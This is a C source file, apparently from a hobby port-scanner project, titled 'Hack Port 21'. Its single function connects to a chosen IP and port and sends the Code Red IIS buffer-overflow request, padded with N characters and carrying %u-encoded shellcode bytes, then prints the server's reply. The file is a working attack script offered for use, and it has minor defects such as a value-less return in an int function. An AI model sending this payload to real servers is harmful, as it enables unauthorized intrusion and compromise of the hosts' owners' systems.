/*
 ============================================================================
 Name        : Hack_port_21.c
 Author      : L.
 Version     : 1.0.5
 Copyright   : GNU General Public License v3.0
 Description : Hack Port 21
 ============================================================================
 */

#include "TCP_Syn_Port_Scanner.h"

int hack_buffer_overflow(in_addr_t ip, int port, int type){
	char msg[512]="";
	int sk=socket(AF_INET,SOCK_STREAM, 0);
	if(sk<0){
		show_error("Error creating socket.", errno);
		exit(EXIT_FAILURE);
	}
	struct sockaddr_in serverAddress;
	serverAddress.sin_family = AF_INET;
	serverAddress.sin_port=htons(port);
	serverAddress.sin_addr.s_addr= ip;
	if(connect(sk, (struct sockaddr *) &serverAddress, sizeof(serverAddress))<0){
		show_error("Error connecting to server.", errno);
		return RETURN_ERROR;
	}
	fd_set read_fd_set;
	FD_ZERO(&read_fd_set);
	FD_SET((unsigned int)sk, &read_fd_set);
	char serverResp[BUFFER_RECV_MSG]={'\0'};
	struct timeval timeout;
	int bytesTransmm=0;
	switch(type){
	case CODE_RED:
		snprintf(msg, sizeof(msg),"%s", "GET /default.ida?NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN"
					"NNNNNNNNNNNNNNNNNN NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN"
					"NNNNNNNNNNNN NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN"
					"NNNNNN NNNNNNNNNNNNNNNNNNNNNNNNN%u9090%u6858%ucbd3%u7801%u9090%u6858%ucbd3%u780"
					"1%u9090%u6858%ucbd3%u7801%u9090%u9090%u8190%u00c3%u0003%u8b00%u531b%u53ff%u0078"
					"%u0000%u00=a HTTP/1.0");
		break;
	default:
		return;
	}
	bytesTransmm=send(sk, msg, strlen(msg), MSG_NOSIGNAL);
	if(bytesTransmm < 0){
		show_error("Error sending msg.", errno);
		if(strstr(strerror(errno), "Broken pipe") != NULL){
			show_error("Possibly the host closed the connection. Aborting", 0);
			close(sk);
			printf("%s",DEFAULT);
			return RETURN_ERROR;
		}
	}
	do{
		FD_ZERO(&read_fd_set);
		FD_SET((unsigned int)sk, &read_fd_set);
		timeout.tv_sec = 10;
		timeout.tv_usec = 0;
		select(sk+1, &read_fd_set, NULL, NULL, &timeout);
		if (!(FD_ISSET(sk, &read_fd_set))) {
			printf("No response (timeout)\n");
			break;
		}
		int bytesReciv=recv(sk, serverResp, sizeof(serverResp),0);
		if(bytesReciv==0){
			printf("No response\n");
			break;
		}
		if(bytesReciv<0){
			show_error("", errno);
			break;
		}
		if(bytesReciv>0){
			printf("%s",HRED);
			for(int i=0;i<bytesReciv;i++) printf("%c",serverResp[i]);
			printf("\n");
			printf("%s",DEFAULT);
			break;
		}
	}while(TRUE);
}
